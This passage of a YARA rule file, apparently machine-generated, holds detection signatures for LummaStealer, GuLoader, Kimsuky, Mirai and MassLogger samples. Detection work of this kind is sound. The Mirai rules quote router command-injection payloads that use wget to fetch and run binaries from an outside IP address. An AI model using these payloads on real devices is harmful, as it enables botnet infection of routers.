      $s11 = "cxkniubi" fullword wide /* score: '8.00'*/
      $s12 = "kAtZ ,k" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule LummaStealer_signature__09f031ea525e7cdafcd838a196d2893b_imphash_ {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_09f031ea525e7cdafcd838a196d2893b(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b96d62f1722f493a739f3344197f48847bc0ba09b40230cf998efb615871b1d0"
   strings:
      $s1 = "curity><requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel></requeste" ascii /* score: '23.00'*/
      $s2 = "Project3.exe" fullword ascii /* score: '22.00'*/
      $s3 = "hemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware></windowsSettings></application></assembly>" fullword ascii /* score: '13.00'*/
      $s4 = "ZSELv*Z:\\hswV" fullword ascii /* score: '10.00'*/
      $s5 = ",JBOZ:\"7" fullword ascii /* score: '10.00'*/
      $s6 = "oqiB.ZKo" fullword ascii /* score: '10.00'*/
      $s7 = "UNpm:\"t" fullword ascii /* score: '10.00'*/
      $s8 = "Export Token" fullword wide /* score: '10.00'*/
      $s9 = "Download Workspace" fullword wide /* score: '10.00'*/
      $s10 = "Driver-6::authz v2.10" fullword wide /* score: '10.00'*/
      $s11 = "32#(.}74)" fullword ascii /* score: '9.00'*/ /* hex encoded string '2t' */
      $s12 = ";#;+;2;=;e;" fullword ascii /* score: '9.00'*/ /* hex encoded string '.' */
      $s13 = "azdlL!" fullword ascii /* score: '9.00'*/
      $s14 = "4$4.444;4" fullword ascii /* score: '9.00'*/ /* hex encoded string 'DDD' */
      $s15 = "Encrypt Library" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 24000KB and
      8 of them
}

rule GuLoader_signature__3abe302b6d9a1256e6a915429af4ffd2_imphash_ {
   meta:
      description = "_subset_batch - file GuLoader(signature)_3abe302b6d9a1256e6a915429af4ffd2(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "87feaf0dab0feb21ff156edd95508158ae5310aff4593cc25a195f0f67b2ce86"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = ",,,!!!" fullword ascii /* reversed goodware string '!!!,,,' */ /* score: '20.00'*/
      $s3 = "tsjappet rumskibs.exe" fullword wide /* score: '19.00'*/
      $s4 = "nstall System v3.04</description><trustInfo xmlns=\"urn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requested" ascii /* score: '16.00'*/
      $s5 = "ecutionLevel level=\"asInvoker\" uiAccess=\"false\"/></requestedPrivileges></security></trustInfo><compatibility xmlns=\"urn:sch" ascii /* score: '14.00'*/
      $s6 = "'''###" fullword ascii /* reversed goodware string '###'''' */ /* score: '11.00'*/
      $s7 = "&&&&&&(((!!!" fullword ascii /* score: '10.00'*/
      $s8 = "((((((!!!" fullword ascii /* score: '10.00'*/
      $s9 = "Gynget0" fullword ascii /* score: '10.00'*/
      $s10 = "Gynget1" fullword ascii /* score: '10.00'*/
      $s11 = "Gynget" fullword ascii /* score: '8.00'*/
      $s12 = "%hHHHHHHHHHHHHHH%i" fullword ascii /* score: '8.00'*/
      $s13 = "afspaltningernes" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and 4 of them
}

rule GuLoader_signature__4f67aeda01a0484282e8c59006b0b352_imphash_ {
   meta:
      description = "_subset_batch - file GuLoader(signature)_4f67aeda01a0484282e8c59006b0b352(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "afed591813af06421614476445cbeb3562cbbf81dfb9abe73f31ffdd4e9a1424"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "nstall System v3.01</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      1 of ($x*) and all of them
}

rule GuLoader_signature__9a16e282eba7cc710070c0586c947693_imphash_ {
   meta:
      description = "_subset_batch - file GuLoader(signature)_9a16e282eba7cc710070c0586c947693(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "54d1b412c756fa7c8ea26801ec08823a94603078a46b701b7ef5e4484d472fe0"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "nstall System v3.11</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s3 = "~nsu%X.tmp" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule GuLoader_signature__9a16e282eba7cc710070c0586c947693_imphash__e5ba4245 {
   meta:
      description = "_subset_batch - file GuLoader(signature)_9a16e282eba7cc710070c0586c947693(imphash)_e5ba4245.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e5ba4245e1b7f0803e5166748248688367935599518c466dce02ce60949af729"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "nstall System v3.11</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s3 = "~nsu%X.tmp" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and all of them
}

rule GuLoader_signature__b78ecf47c0a3e24a6f4af114e2d1f5de_imphash_ {
   meta:
      description = "_subset_batch - file GuLoader(signature)_b78ecf47c0a3e24a6f4af114e2d1f5de(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "dfb78e200895d26f83fe2213443acc79282987f6f56ef130741b460f07722bda"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "arrowing gennemsnitsfiltreringernes.exe" fullword wide /* score: '19.00'*/
      $s3 = "nstall System v3.01</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s4 = "$Vulkanologi Flipproletariat Germule 1" fullword ascii /* score: '9.00'*/
      $s5 = "chokrapporternes quirting" fullword wide /* score: '9.00'*/
      $s6 = "cdefghijkkljmnopqrsb" fullword ascii /* score: '8.00'*/
      $s7 = "iiihgggrrs" fullword ascii /* score: '8.00'*/
      $s8 = "bcdefgh" fullword ascii /* score: '8.00'*/
      $s9 = "ccdddddddddddcb" ascii /* score: '8.00'*/
      $s10 = "pljigfcb" fullword ascii /* score: '8.00'*/
      $s11 = "ikihggggrrsuv" fullword ascii /* score: '8.00'*/
      $s12 = "jklmnop" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and 4 of them
}

rule LummaStealer_signature__92ef7f06d20469dda32fc3d17a160c0f_imphash_ {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_92ef7f06d20469dda32fc3d17a160c0f(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f1f9d56828930cae3f6af04fe5be9fc425fea7d3df246f4d3297d867a979d4ee"
   strings:
      $s1 = "CPTuxPN.dll" fullword ascii /* score: '23.00'*/
      $s2 = "  VirtualQuery failed for %d bytes at address %p" fullword ascii /* score: '13.00'*/
      $s3 = "%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p." fullword ascii /* score: '12.50'*/
      $s4 = "hggggggggg" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 800KB and
      all of them
}

rule LummaStealer_signature__68c812220ef41a1bea0980e196c18e31_imphash_ {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_68c812220ef41a1bea0980e196c18e31(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "31868613d2137f71329548ca947794e1472e480a0ce5e079430437958c735407"
   strings:
      $s1 = "DataSync.exe" fullword wide /* score: '22.00'*/
      $s2 = ".get] j_Q_Q_e.VH-OwpV T.G.z.Vk_f.x T b B_b* K E_cZ.G_FK B" fullword ascii /* score: '16.00'*/
      $s3 = "Developed by SyncSolutions Inc. Visit www.syncsolutions.com for more information." fullword wide /* score: '14.00'*/
      $s4 = "* Z/_K.H_Vb.hil.i.w8_u Lm0 z.t.2_dr C.5_" fullword ascii /* score: '12.00'*/
      $s5 = "T^_p K.iE.V O.lZA i.j_G.0.KWMfTpv.p.U.X_D)" fullword ascii /* score: '12.00'*/
      $s6 = "R.Z.M B%Cs% H)t?_fw_X_y^_F|_n_M:_B.z j* d].e b_GL m b.T y.p.Puf c.q_Z f.2n" fullword ascii /* score: '12.00'*/
      $s7 = "DataSync - Enterprise data synchronization tool" fullword wide /* score: '12.00'*/
      $s8 = "j C n* y_f_P_d N.7 u.A.b m.nqJ_y_A.U_j.SPL,.k_a H.p.spND,.3.XY.Z q_m.W1 s p B8_" fullword ascii /* score: '11.00'*/
      $s9 = "e T_i.w.2.Y>.X%G.X.7.l_ls.3`.jVXA.t d x`K.O2i3_p_r+ q S_hV.V)c$.bkq iB.O F7k" fullword ascii /* score: '11.00'*/
      $s10 = "Lf.D U.u%.l.93n.d F!_O.L- o.OfU.w.H_M wm8[.e.K.W ardy A_t~.l MK A4." fullword ascii /* score: '11.00'*/
      $s11 = "- zc_M bV1.y_H.f_X C42OW<.t.X_Q.l_RK# X_H_g.qeXF P I F m_q K0 q.x s p_i).z.Te.G.WWA E+B on W.p_" fullword ascii /* score: '11.00'*/
      $s12 = "Mi Y A.Npa T.j I.b.V.90_Z.w| D_T_K_lXA* XB_J O.x_C YP_OYUT.t K.l.G_P_G r_x W.lz.T$u.O f_h " fullword ascii /* score: '11.00'*/
      $s13 = ".0.xN m Z.rnQ B.Kk drsi j.PsK.v.N a* j F.c.e&_bb I.f{.hs m: b.5pL_" fullword ascii /* score: '11.00'*/
      $s14 = "_Y.0.k.0_X kU.Jd`.y.GcCn:r_W.GAe.5.9+ vd_h.zT{_G_iX_M_f.vj_w." fullword ascii /* score: '11.00'*/
      $s15 = "c Q_BJPV_f_P M q.D_p.2.V+|.1.2.i.S>U t n\\w U.k=_b.YMt W_a- t.F$ Q.p.Bh Hp_p@_R m_O_" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 17000KB and
      8 of them
}

rule Kimsuky_signature__367db678c963a7e405aff9d24411c216_imphash_ {
   meta:
      description = "_subset_batch - file Kimsuky(signature)_367db678c963a7e405aff9d24411c216(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b61a3d49b9db1ccd2a0124e94755ddca600c32064aa6cfe5a8ff7da07c154f9a"
   strings:
      $s1 = "iUSER32.dll" fullword ascii /* score: '26.00'*/
      $s2 = "termsadisd.dll" fullword ascii /* score: '23.00'*/
      $s3 = "dfgdeyerty" fullword ascii /* score: '13.00'*/
      $s4 = "QGQSCiGo.pbG!o" fullword ascii /* score: '10.00'*/
      $s5 = "* fx;`_G" fullword ascii /* score: '9.00'*/
      $s6 = "hjktyjfgf" fullword ascii /* score: '8.00'*/
      $s7 = "asdgnrtrtg" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 12000KB and
      all of them
}

rule Mirai_signature__07959d83 {
   meta:
      description = "_subset_batch - file Mirai(signature)_07959d83.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "07959d83c374cd26d49dcc2f9e23912178a0ddf9256abc9837b531d48d4455d2"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '43.00'*/
      $s2 = "76.65.148.18 -l /tmp/bigH -r /bins/mips;chmod 777 /tmp/bigH;/tmp/bigH huawei.rep.mips;rm -rf /tmp/bigH)</NewStatusURL><NewDownlo" ascii /* score: '26.00'*/
      $s3 = "g/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(busybox wget -" ascii /* score: '20.00'*/
      $s4 = "POST /tmUnblock.cgi HTTP/1.1" fullword ascii /* score: '19.00'*/
      $s5 = "User-Agent: python-requests/2.20.0" fullword ascii /* score: '17.00'*/
      $s6 = "ttcp_ip=-h+%60cd+%2Ftmp%3B+rm+-rf+mpsl%3B+wget+http%3A%2F%2F176.65.148.18%2Fbins%2Fmpsl%3B+chmod+777+mpsl%3B+.%2Fmpsl+linksys%60" ascii /* score: '15.00'*/
      $s7 = "ttcp_ip=-h+%60cd+%2Ftmp%3B+rm+-rf+mpsl%3B+wget+http%3A%2F%2F176.65.148.18%2Fbins%2Fmpsl%3B+chmod+777+mpsl%3B+.%2Fmpsl+linksys%60" ascii /* score: '15.00'*/
      $s8 = "Host: 1.1.1.1:80" fullword ascii /* score: '14.00'*/
      $s9 = "adURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
      $s10 = "Content-Length: 430" fullword ascii /* score: '9.00'*/
      $s11 = "Content-Length: 227" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      1 of ($x*) and all of them
}

rule Kimsuky_signature__9afe3b074151497bd679a59dd4495420_imphash_ {
   meta:
      description = "_subset_batch - file Kimsuky(signature)_9afe3b074151497bd679a59dd4495420(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a83cf99ae1567a24ed2fd912b437dee7e3f2f2db9a125889f6ff36024d2827e5"
   strings:
      $s1 = "api-ms-win-core-synch-l1-2-0.dll" fullword wide /* reversed goodware string 'lld.0-2-1l-hcnys-eroc-niw-sm-ipa' */ /* score: '30.00'*/
      $s2 = "termsadisd.dll" fullword ascii /* score: '23.00'*/
      $s3 = "dfgdeyerty" fullword ascii /* score: '13.00'*/
      $s4 = "\\^^^^^^^^^^" fullword ascii /* reversed goodware string '^^^^^^^^^^\\' */ /* score: '12.00'*/
      $s5 = "^^^^^^N" fullword ascii /* reversed goodware string 'N^^^^^^' */ /* score: '11.00'*/
      $s6 = "BMNKg:\\8S[" fullword ascii /* score: '10.00'*/
      $s7 = "sLpd:\"{" fullword ascii /* score: '10.00'*/
      $s8 = "%s-v\\n:\\'" fullword ascii /* score: '9.50'*/
      $s9 = ";*61:^^^^" fullword ascii /* score: '9.00'*/ /* hex encoded string 'a' */
      $s10 = "7;,?,=6'~" fullword ascii /* score: '9.00'*/ /* hex encoded string 'v' */
      $s11 = "^^^^^.^2^^^^^.^*^^^^^,^1^^^^^,^+^^^^^6^,^^^^^-^5^^^^^-^/^^^^^-^(^^^^^*^6^^^^^*^,^^^^^+^,^^^^^7^:^^^^^<^;^^^^^-^2^^^^^;^*^^^^^2^(" ascii /* score: '9.00'*/ /* hex encoded string '!eg"' */
      $s12 = "_^^^5^^^^^^^6" fullword ascii /* score: '9.00'*/ /* hex encoded string 'V' */
      $s13 = "-*:=?22^^^^^^^" fullword ascii /* score: '9.00'*/ /* hex encoded string '"' */
      $s14 = "*67-=?22^^^^^^" fullword ascii /* score: '9.00'*/ /* hex encoded string 'g"' */
      $s15 = "m- /Ww}" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 13000KB and
      8 of them
}

rule Mirai_signature__074b4dff {
   meta:
      description = "_subset_batch - file Mirai(signature)_074b4dff.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "074b4dff7daf26b1b39052f36067b3d0c1dd5826e2b69a7955b482ef39200561"
   strings:
      $s1 = "yxGET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget%%20http%%3A//%d.%d.%d.%d/router.tplink.sh%%20-O-%%" ascii /* score: '26.00'*/
      $s2 = "yxGET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(wget%%20http%%3A//%d.%d.%d.%d/router.tplink.sh%%20-O-%%" ascii /* score: '26.00'*/
      $s3 = "No child process" fullword ascii /* score: '15.00'*/
      $s4 = "Host: %d.%d.%d.%d:80" fullword ascii /* score: '14.50'*/
      $s5 = "No file descriptors available" fullword ascii /* score: '10.00'*/
      $s6 = "__vdso_clock_gettime" fullword ascii /* score: '9.00'*/
      $s7 = "attack_get_opt_u32" fullword ascii /* score: '9.00'*/
      $s8 = "__vdso_clock_gettime64" fullword ascii /* score: '9.00'*/
      $s9 = "attack_get_opt_u16" fullword ascii /* score: '9.00'*/
      $s10 = "attack_get_opt_u8" fullword ascii /* score: '9.00'*/
      $s11 = "attack_get_opt_str" fullword ascii /* score: '9.00'*/
      $s12 = "attack_get_opt_len" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      8 of them
}

rule GuLoader_signature__6e7f9a29f2c85394521a08b9f31f6275_imphash_ {
   meta:
      description = "_subset_batch - file GuLoader(signature)_6e7f9a29f2c85394521a08b9f31f6275(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1d681b4dc312fe1df40f149da82d3e661c637f2d7ef93ec8d556c31901f51666"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "nstall System v3.06</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s3 = "jjicxxw" fullword ascii /* score: '8.00'*/
      $s4 = "partridgeberry" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      1 of ($x*) and all of them
}

rule LummaStealer_signature__09ff7f0eb0ed07f2013be1742e633b97_imphash_ {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_09ff7f0eb0ed07f2013be1742e633b97(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e65be0df3ca792074f7c2f8cf030235b06ef915082f59c2f897922c93ba46762"
   strings:
      $s1 = "            <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>" fullword ascii /* score: '15.00'*/
      $s2 = "        <dpiAwareness xmlns=\"http://schemas.microsoft.com/SMI/2016/WindowsSettings\">PerMonitorV2</dpiAwareness>" fullword ascii /* score: '12.00'*/
      $s3 = "            processorArchitecture=\"*\"" fullword ascii /* score: '10.00'*/
      $s4 = "    processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
      $s5 = "    name=\"Microsoft.Windows.onecoreuapshell.PickerHost\"" fullword ascii /* score: '9.00'*/
      $s6 = "            publicKeyToken=\"6595b64144ccf1df\"" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      all of them
}

rule LummaStealer_signature__42160d6791be95302ef4d8721aff11df_imphash_ {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_42160d6791be95302ef4d8721aff11df(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c48c401683f6c800f9377d7646a73f1e1df3ed457cf2db46cdae22a5ebe36bae"
   strings:
      $s1 = "}C:\\\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\AppLaunch.exe" fullword wide /* score: '24.00'*/
      $s2 = "OpenProcessToken failed. Error: %lu" fullword ascii /* score: '21.00'*/
      $s3 = "GetTokenInformation failed. Error: %lu" fullword ascii /* score: '15.00'*/
      $s4 = "            <requestedExecutionLevel" fullword ascii /* score: '11.00'*/
      $s5 = "    processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule LummaStealer_signature__42160d6791be95302ef4d8721aff11df_imphash__b100a8c5 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_42160d6791be95302ef4d8721aff11df(imphash)_b100a8c5.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b100a8c52026ddd5981eefbfa36881dc070801404b3a6e3f89433b85b6382a3a"
   strings:
      $s1 = "}C:\\\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\AppLaunch.exe" fullword wide /* score: '24.00'*/
      $s2 = "OpenProcessToken failed. Error: %lu" fullword ascii /* score: '21.00'*/
      $s3 = "GetTokenInformation failed. Error: %lu" fullword ascii /* score: '15.00'*/
      $s4 = "            <requestedExecutionLevel" fullword ascii /* score: '11.00'*/
      $s5 = "    processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule LummaStealer_signature__c4b185fc6a9ca983e00f1684a13ef4e1_imphash__35190dd2 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_c4b185fc6a9ca983e00f1684a13ef4e1(imphash)_35190dd2.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "35190dd2e545f62a1b3903ce90d0bfd3744f727754b1c42b4c612209300168a7"
   strings:
      $s1 = "LExecution of the Chakra scripting engine is blocked for Windows Script Host." fullword wide /* score: '24.00'*/
      $s2 = "                <requestedExecutionLevel level=\"asInvoker\" />" fullword ascii /* score: '15.00'*/
      $s3 = "    <description>Windows Based Script Host</description>" fullword ascii /* score: '10.00'*/
      $s4 = " DescriptionW" fullword ascii /* score: '10.00'*/
      $s5 = "       processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule LummaStealer_signature__2eabe9054cad5152567f0699947a2c5b_imphash__20e4a7b9 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_20e4a7b9.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "20e4a7b977f3fe7c9c21f8fdaf1a676f66618e4a151c7d4d3b8481d48189fbbe"
   strings:
      $s1 = "2&~7`+;%(" fullword ascii /* score: '9.00'*/ /* hex encoded string ''' */
      $s2 = "* A.&!" fullword ascii /* score: '9.00'*/
      $s3 = "aieyfyyz" fullword ascii /* score: '8.00'*/
      $s4 = "hzdjkhtu" fullword ascii /* score: '8.00'*/
      $s5 = "nosplta" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      all of them
}

rule LummaStealer_signature__2eabe9054cad5152567f0699947a2c5b_imphash__4b551dfd {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_2eabe9054cad5152567f0699947a2c5b(imphash)_4b551dfd.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4b551dfd14e040d97bfd77f8e4bda54ac424eca1eb65e378b431df390644f2e8"
   strings:
      $s1 = "* |bIy" fullword ascii /* score: '9.00'*/
      $s2 = "-Com -" fullword ascii /* score: '8.00'*/
      $s3 = "yoczzwzx" fullword ascii /* score: '8.00'*/
      $s4 = "ffgurgey" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      all of them
}

rule MassLogger_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__4c463b6b {
   meta:
      description = "_subset_batch - file MassLogger(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_4c463b6b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4c463b6b2c03f037fdb1f011a547b1c794fd13d9e1174285991adcdef1f59a46"
   strings:
      $x1 = "C:\\Users\\Administrator\\Desktop\\Client\\Temp\\BGvrVwZXgT\\src\\obj\\Debug\\wQXc.pdb" fullword ascii /* score: '40.00'*/
      $s2 = "System.Windows.Forms.LeftRightAlignment, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" ascii /* score: '27.00'*/
      $s3 = "System.Windows.Forms.HorizontalAlignment, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e08" ascii /* score: '27.00'*/
      $s4 = "ystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADPBj" fullword ascii /* score: '24.00'*/
      $s5 = "wQXc.exe" fullword wide /* score: '22.00'*/
      $s6 = "Vip.CustomForm.Images.SystemButtons.bmp" fullword wide /* score: '17.00'*/
      $s7 = "m_systemCommands" fullword ascii /* score: '15.00'*/
      $s8 = "get_FrameLayout" fullword ascii /* score: '12.00'*/
      $s9 = "GetButtonCommand" fullword ascii /* score: '12.00'*/
      $s10 = "OnWmSysCommand" fullword ascii /* score: '12.00'*/
      $s11 = "-Gets or Set Value to Drop Shadow to the form." fullword ascii /* score: '11.00'*/
      $s12 = "*Gets or Set the valur for BorderThickness." fullword ascii /* score: '9.00'*/
      $s13 = "get_DesktopRectangle" fullword ascii /* score: '9.00'*/
      $s14 = "get_IconBox" fullword ascii /* score: '9.00'*/
      $s15 = "GetControlButtonId" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule LummaStealer_signature__71cc5af9daad65e58c6f29c42cdf9201_imphash_ {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_71cc5af9daad65e58c6f29c42cdf9201(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "49db3fe437f4861be463e13cfbf9d579281ac44069672d24ec1f134d968ece06"
   strings:
      $s1 = "ENIGMA" fullword ascii /* PEStudio Blacklist: strings */ /* score: '8.50'*/
      $s2 = "p/AzwiB& -" fullword ascii /* score: '8.00'*/
      $s3 = "_9r -:6;rEtbvux" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule LummaStealer_signature__71cc5af9daad65e58c6f29c42cdf9201_imphash__aee52e16 {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_71cc5af9daad65e58c6f29c42cdf9201(imphash)_aee52e16.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "aee52e1687e09cfa944f3a8b657cc51964f26f99ed126283510c01dbff80cc71"
   strings:
      $s1 = "ehttp://pki-crl.symauth.com/offlineca/TheInstituteofElectricalandElectronicsEngineersIncIEEERootCA.crl0" fullword ascii /* score: '19.00'*/
      $s2 = "Lhttp://pki-crl.symauth.com/ca_732b6ec148d290c0a071efd1dac8e288/LatestCRL.crl07" fullword ascii /* score: '16.00'*/
      $s3 = "http://pki-ocsp.symauth.com0" fullword ascii /* score: '13.00'*/
      $s4 = "* p3%t" fullword ascii /* score: '9.00'*/
      $s5 = "xxjalze" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      all of them
}

rule LummaStealer_signature__9d8e3cf6f392a9ab65ed7849b23cf6b5_imphash_ {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_9d8e3cf6f392a9ab65ed7849b23cf6b5(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "02c22cb54244b9a05b47ce93046dbdbdee3724ae33e63799163975eaad85c698"
   strings:
      $s1 = "%SystemRoot%\\System32\\shell32.dll,154" fullword wide /* score: '30.00'*/
      $s2 = "notepad.exe \"%1\"" fullword wide /* score: '14.00'*/
      $s3 = "UVWSPH" fullword ascii /* reversed goodware string 'HPSWVU' */ /* score: '13.50'*/
      $s4 = "Software\\Classes\\AutoProx.File\\shell\\open\\command" fullword wide /* score: '13.00'*/
      $s5 = "RegCreateKeyExW(EventSource)" fullword wide /* score: '12.00'*/
      $s6 = "This file demonstrates HKCU file association and Shell copy." fullword wide /* score: '12.00'*/
      $s7 = "SYSTEM\\CurrentControlSet\\Services\\EventLog\\Application\\AutoProx" fullword wide /* score: '11.00'*/
      $s8 = "sample.apx" fullword wide /* score: '10.00'*/
      $s9 = "IFileOperation::PerformOperations" fullword wide /* score: '9.00'*/
      $s10 = "CoCreateInstance(CLSID_FileOperation)" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 12000KB and
      all of them
}

rule LummaStealer_signature__08a07d9be19d1f329c4ea80bf355ee64_imphash_ {
   meta:
      description = "_subset_batch - file LummaStealer(signature)_08a07d9be19d1f329c4ea80bf355ee64(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f5906f6cd5ca863a4dab72d1cb2a3042817f889fd8b1cd639fd4e21ebc6e1bf1"
   strings:
